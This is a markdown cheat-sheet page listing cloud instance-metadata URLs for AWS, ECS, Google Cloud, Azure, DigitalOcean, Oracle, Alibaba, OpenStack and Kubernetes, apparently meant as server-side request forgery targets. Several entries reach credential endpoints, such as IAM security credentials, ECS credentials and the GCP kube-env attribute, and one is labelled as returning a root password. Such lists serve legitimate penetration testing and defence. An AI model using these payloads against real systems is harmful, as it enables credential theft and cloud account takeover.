---
layout: memory
title: List of various Cloud Metadata Service Addresses
---

### IPv6 Tests
    http://[::ffff:169.254.169.254]
    http://[0:0:0:0:0:ffff:169.254.169.254]

### AWS 
Amazon Web Services (No Header Required) [Source](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories)

    http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
    http://169.254.169.254/latest/user-data
    http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
    http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
    http://169.254.169.254/latest/meta-data/ami-id
    http://169.254.169.254/latest/meta-data/reservation-id
    http://169.254.169.254/latest/meta-data/hostname
    http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
    http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key

### ECS Task : https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-metadata-endpoint-v2.html

    http://169.254.170.2/v2/credentials/

### Google Cloud (Header Sometimes Required)
Source:  https://cloud.google.com/compute/docs/metadata
  - Requires the header "Metadata-Flavor: Google" or "X-Google-Metadata-Request: True" on API v1
  - Most endpoints can be accessed via the v1beta API without a header

    ```  
    http://169.254.169.254/computeMetadata/v1/
    http://metadata.google.internal/computeMetadata/v1/
    http://metadata/computeMetadata/v1/
    http://metadata.google.internal/computeMetadata/v1/instance/hostname
    http://metadata.google.internal/computeMetadata/v1/instance/id
    http://metadata.google.internal/computeMetadata/v1/project/project-id
    ```
    
### kube-env; thanks to JackMc for the heads up on this (https://hackerone.com/reports/341876)
    http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env

### Google allows recursive pulls 
    http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true

### returns root password for Google
    http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json

### Digital Ocean (No Header Required)
[Source](https://developers.digitalocean.com/documentation/metadata/)

    http://169.254.169.254/metadata/v1.json
    http://169.254.169.254/metadata/v1/ 
    http://169.254.169.254/metadata/v1/id   
    http://169.254.169.254/metadata/v1/user-data
    http://169.254.169.254/metadata/v1/hostname
    http://169.254.169.254/metadata/v1/region   
    http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address

### Packetcloud
    https://metadata.packet.net/userdata

### Azure (Header Required)
> Requires Header: "Metadata: true"
Source: https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service
(Old: ) https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/

    http://169.254.169.254/metadata/instance?api-version=2017-04-02
    http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text

### Oracle Cloud (No Header Required)
Source: https://docs.us-phoenix-1.oraclecloud.com/Content/Compute/Tasks/gettingmetadata.htm
    
    http://169.254.169.254/opc/v1/instance/

### Alibaba Cloud
Source: https://www.alibabacloud.com/help/faq-detail/49122.htm

    http://100.100.100.200/latest/meta-data/
    http://100.100.100.200/latest/meta-data/instance-id
    http://100.100.100.200/latest/meta-data/image-id

### OpenStack/RackSpace 
Source: https://docs.openstack.org/nova/latest/user/metadata-service.html

    http://169.254.169.254/openstack	 

### Oracle Cloud
Source:  https://docs.oracle.com/en/cloud/iaas/compute-iaas-cloud/stcsg/retrieving-instance-metadata.html

    http://192.0.0.192/latest/
    http://192.0.0.192/latest/user-data/
    http://192.0.0.192/latest/meta-data/
    http://192.0.0.192/latest/attributes/

### Kubernetes
Debug Services (https://kubernetes.io/docs/tasks/debug-application-cluster/debug-service/)

    https://kubernetes.default.svc.cluster.local
    https://kubernetes.default

Sources: 
- https://twitter.com/Random_Robbie/status/1072242182306832384
- https://kubernetes.default.svc/metrics
